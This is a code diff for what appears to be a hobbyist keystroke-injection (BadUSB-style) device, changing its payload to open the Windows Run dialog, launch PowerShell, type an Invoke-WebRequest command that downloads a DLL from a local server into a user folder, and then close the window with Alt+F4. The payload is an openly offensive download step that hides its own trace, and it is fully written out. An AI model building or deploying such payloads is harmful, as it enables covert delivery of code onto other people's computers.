@@ -4,7 +4,9 @@
 
 #include "KeyStroke.hpp"
 #include "BoardRuntime.hpp"
-#include "Utils.hpp"
+#include "IPayloadAction.hpp"
+#include "SendKeystrokesAction.hpp"
+#include "DelayAction.hpp"
 
 void flash_led(uint32_t cooldown_millis = 1000)
 {
@@ -14,21 +16,43 @@ void flash_led(uint32_t cooldown_millis = 1000)
     board_delay(1000);
 }
 
+static std::vector<IPayloadAction::Ptr> make_payload()
+{
+    std::vector<IPayloadAction::Ptr> result;
+
+    const std::string powershell_script = "Invoke-WebRequest http://localhost:8000/SimpleDll.dll -OutFile C:\\Users\\alper\\bomboclat.dll\n";
+
+    result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_special_binding(KeyStroke::SpecialKeyBinding::WIN_PLUS_R)));
+
+    static constexpr uint32_t RUN_POPUP_OPEN_DURATION_MILLIS = 100;
+    result.push_back(std::make_unique<DelayAction>(RUN_POPUP_OPEN_DURATION_MILLIS));
+
+    result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_string("powershell\n")));
+
+    static constexpr uint32_t POWERSHELL_OPEN_DURATION_MILLIS = 500;
+    result.push_back(std::make_unique<DelayAction>(POWERSHELL_OPEN_DURATION_MILLIS));
+
+    result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_string(powershell_script)));
+
+    static constexpr uint32_t SCRIPT_EXECUTION_DELAY_MILLIS = 1000;
+    result.push_back(std::make_unique<DelayAction>(SCRIPT_EXECUTION_DELAY_MILLIS));
+
+    result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_special_binding(KeyStroke::SpecialKeyBinding::ALT_F4)));
+
+    return result;
+}
+
 void loop()
 {
-    const std::vector<KeyStroke> payload = Utils::concat(KeyStroke::from_special_binding(KeyStroke::SpecialKeyBinding::WIN_PLUS_R), KeyStroke::from_string("cmd\n"));
+    const std::vector<IPayloadAction::Ptr> payload = make_payload();
 
     flash_led();
 
-    for (const KeyStroke &keystroke : payload)
+    for (const IPayloadAction::Ptr& action : payload)
     {
-        tud_task();
-        keystroke.press();
-        board_delay(50);
-        keystroke.release();
-        board_delay(50);
+        action->run();
     }
-    
+
     flash_led();
 }
 
